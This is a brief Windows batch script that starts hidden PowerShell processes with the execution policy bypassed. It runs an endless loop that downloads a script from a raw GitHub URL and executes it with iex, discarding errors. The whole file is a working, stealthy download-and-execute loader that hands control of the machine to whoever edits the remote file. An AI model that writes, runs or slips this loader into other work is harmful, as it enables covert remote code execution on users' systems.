@echo off
setlocal

set "url=https://raw.githubusercontent.com/Axolotl-in-void/powerhell/main/file.ps1"

:: Launch persistent hidden PowerShell (this version works better)
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"while($true){try{iex (iwr ''%url%'' -UseBasicParsing).Content}catch{}}'\"' -WindowStyle Hidden -PassThru" >nul 2>&1

exit
